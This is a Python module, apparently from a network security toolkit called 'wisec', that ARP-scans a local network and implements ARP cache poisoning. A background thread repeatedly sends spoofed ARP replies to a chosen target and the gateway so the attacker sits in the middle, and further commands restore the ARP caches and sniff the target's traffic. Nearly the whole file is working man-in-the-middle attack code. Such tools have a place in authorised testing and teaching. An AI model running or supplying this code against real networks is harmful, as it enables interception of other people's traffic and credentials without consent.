import argparse
import time
from scapy.all import ARP, Ether, srp, sendp, sniff
from cmd2 import argparse_completer
from wisec.common import shorts, lan, gateway
from functools import total_ordering
from threading import Thread
import socket


@total_ordering
class Host:
    def __init__(self, p):
        self.mac = p.hwsrc
        self.ip = p.psrc
        self.hostname = ''
        try:
            self.hostname = socket.gethostbyaddr(self.ip)[0]
        except socket.herror:
            pass
        self.short = None

        if self.mac in shorts:
            self.short = shorts[self.mac]

    def names(self):
        ret = [self.mac, self.ip]
        if self.hostname:
            ret.append(self.hostname)
        if self.short:
            ret.append(self.short)
        return ret

    def match(self, name):
        return name in self.names()

    def __str__(self):
        host = f' {self.hostname}' if self.hostname else ''
        name = f' ({self.short})' if self.short is not None else ''
        return f'{self.ip:12} / {self.mac}{host}{name}'

    def __eq__(self, o):
        return self.ip == o.ip

    def __le__(self, o):
        for a, b in zip(map(int, self.ip.split('.')),
                        map(int, o.ip.split('.'))):
            r = a - b
            if r != 0:
                return r < 0
        return False

def get_hosts():
    ret = []
    for h in hosts.values():
        ret += h.names()

    for t in shorts.items():
        ret += t

    return ret

def to_mac(name):
    if name in hosts:
        return hosts[name].mac

    for r in hosts.values():
        if r.match(name):
            return r.mac

    for m, n in shorts.items():
        if n == name:
            return m

    return name


def scan(timeout):
    print(f'ARP scanning {lan}')
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
                 ARP(pdst=lan), timeout=timeout)
    ret = []
    for h in ans:
        host = Host(h[1][ARP])
        if host.mac not in hosts:
            ret.append(host)
            hosts[host.mac] = host

    return ret


def handler(args):
    if args.cmd == 'scan':
        res = scan(args.timeout)
        print('\n'.join(map(str, sorted(res))))
        print(f'{len(res)} new / {len(hosts)} total')
    elif args.cmd == 'list':
        print('\n'.join(map(str, sorted(hosts.values()))))
    elif args.cmd == 'poison':
        if args.poison == 'start':
            start_poison(args.target, args.gateway)
        elif args.poison == 'stop':
            stop_poison()
        elif args.poison == 'sniff':
            sniff_poison()
        else:
            poison.print_help()
    else:
        parser.print_help()


pthread = None
def poison_proc(t, g):
    while pthread is not None:
        sendp(Ether() /
              ARP(op=ARP.is_at, pdst=g.ip, hwdst=g.mac, psrc=t.ip))
        sendp(Ether() /
              ARP(op=ARP.is_at, pdst=t.ip, hwdst=t.mac, psrc=g.ip))
        time.sleep(1)


def poison_restore(t, g):
    f = "ff:ff:ff:ff:ff:ff"
    sendp(Ether() /
          ARP(op=ARP.is_at, hwdst=f, pdst=g.ip, hwsrc=t.mac, psrc=t.ip),
          count=5)
    sendp(Ether() /
          ARP(op=ARP.is_at, hwdst=f, pdst=t.ip, hwsrc=g.mac, psrc=g.ip),
          count=5)


ptarget = None
pgateway = None
def start_poison(target, gateway):
    global pthread, ptarget, pgateway
    t, g = None, None
    for host in hosts.values():
        if host.match(target):
            t = host
        elif host.match(gateway):
            g = host

    if t is None:
        print("Unable to find target")
        return
    if g is None:
        print("Unable to find gateway")
        return

    print(f'Poisoning {t} with gateway {g}')

    stop_poison()
    pthread = Thread(target=poison_proc, args=(t, g))
    pthread.start()
    ptarget = t
    pgateway = g


def stop_poison():
    global pthread, ptarget, pgateway
    if pthread:
        tmp = pthread
        pthread = None
        tmp.join()
        poison_restore(ptarget, pgateway)
        ptarget = None
        pgateway = None

def sniff_poison():
    global ptarget
    fltr = 'ip host ' + ptarget.ip
    packets = sniff(filter=fltr)
    print(packets)

def fin():
    stop_poison()

# Arp
parser = argparse.ArgumentParser(prog='arp')
subparsers = parser.add_subparsers(dest='cmd')
## Scan
ascan = subparsers.add_parser('scan')
ascan.add_argument('-t', dest='timeout', type=int, default=5)
## List
alist = subparsers.add_parser('list')

## Poison
poison = subparsers.add_parser('poison')
psub = poison.add_subparsers(dest='poison')
### Start
start = psub.add_parser('start')
target = start.add_argument('target')
setattr(target, argparse_completer.ACTION_ARG_CHOICES, get_hosts)
gateway = start.add_argument('gateway', default=gateway, nargs='?')
### Stop
psub.add_parser('stop')
### Sniff
psub.add_parser('sniff')

hosts = {}
